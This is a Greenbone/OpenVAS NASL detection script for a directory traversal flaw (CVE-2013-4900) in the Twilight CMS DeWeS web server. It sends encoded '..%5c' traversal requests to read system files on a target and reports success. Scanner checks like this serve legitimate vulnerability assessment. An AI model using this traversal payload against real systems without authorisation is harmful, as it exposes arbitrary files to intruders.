if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803746" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2013-4900" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-08-22 12:47:40 +0530 (Thu, 22 Aug 2013)" );
	script_name( "Twilight CMS DeWeS Web Server Directory Traversal Vulnerability" );
	script_tag( name: "summary", value: "The host is running Twilight CMS with DeWeS Web Server and is prone to directory
  traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Send the crafted HTTP GET request and check the is it possible to read
  the system file." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "insight", value: "The flaw is due to an improper sanitation of encoded user input via HTTP
  requests using directory traversal attack (e.g., /..%5c..%5c)." );
	script_tag( name: "affected", value: "Twilight CMS DeWeS web server version 0.4.2 and prior." );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to read arbitrary files
  on the target system." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2013/Aug/136" );
	script_xref( name: "URL", value: "https://www.htbridge.com/advisory/HTB23167" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/528139/30/0/threaded" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/dewes-042-path-traversal" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "DeWeS/banner" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "Server: DeWeS" )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = "/" + crap( data: "..%5c", length: 15 ) + files[file];
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

